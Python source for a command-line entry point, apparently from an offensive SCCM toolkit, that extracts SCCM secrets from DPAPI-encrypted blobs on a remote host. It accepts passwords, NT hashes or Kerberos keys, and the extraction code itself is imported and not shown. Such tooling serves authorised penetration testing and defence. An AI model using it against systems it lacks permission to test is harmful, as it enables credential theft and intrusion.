import typer
from lib.attacks.dpapi import DPAPIHunter
from lib.logger import init_logger

app = typer.Typer()
COMMAND_NAME = 'dpapi'
HELP = 'Extract SCCM secrets from DPAPI encrypted blobs, requires Local Administrator privileges.'

@app.callback(no_args_is_help=True, invoke_without_command=True)

def main(
    username        : str   = typer.Option(..., "-u",  help="Username"),
    password        : str   = typer.Option('', '-p',  help="Password"),
    domain          : str   = typer.Option('', '-d',  help="Target domain"),
    dc_ip           : str   = typer.Option(None, '-dc-ip',  help = "IP address or FQDN of domain controller (Use FQDN if Kerberos is used)"),
    target          : str   = typer.Option(..., '-target',  help = "Target hostname"),
    kerberos        : bool  = typer.Option(False, "-k", help='Use Kerberos authentication'),
    no_pass         : bool  = typer.Option(False, "-no-pass", help="don't ask for password (useful for -k)"),
    hashes          : str   = typer.Option(None, "-hashes",metavar="LMHASH:NTHASH", help="LM and NT hashes, format is LMHASH:NTHASH"),
    aesKey          : str   = typer.Option(None, '-aesKey', metavar="HEX KEY", help='AES key to use for Kerberos Authentication (128 or 256 bits)'),
    wmi             : bool  = typer.Option(False, '-wmi', help='Extract SCCM secrets stored in the WMI repository.'),
    disk            : bool  = typer.Option(False, '-disk', help='Extract SCCM secrets from disk (OBJECTS.DATA), useful for accessing potentially changed or deleted secrets.'),
    both            : bool  = typer.Option(False, '-both', help='Combines both WMI and disk methods to retrieve SCCM secrets.'), 
    debug           : bool  = typer.Option(False, '-debug',help='Enable Verbose Logging'),
    impacket_debug  : bool  = typer.Option(False, '-impacket-debug',help='Enable Impacket Logging')):


    if impacket_debug:
        import logging
        from impacket import version
        logging.getLogger().setLevel(logging.DEBUG)
        logging.debug(version.getInstallationPath())
        logging.debug(version.BANNER)

    logs_dir = init_logger(debug)
    dpapihunter = DPAPIHunter(remoteName=target, username=username, password=password, domain=domain, 
                        kerberos=kerberos, no_pass=no_pass, hashes=hashes, aesKey=aesKey, kdc=dc_ip, logs_dir=logs_dir, debug=debug, wmi=wmi, disk=disk, both=both)
    dpapihunter.run()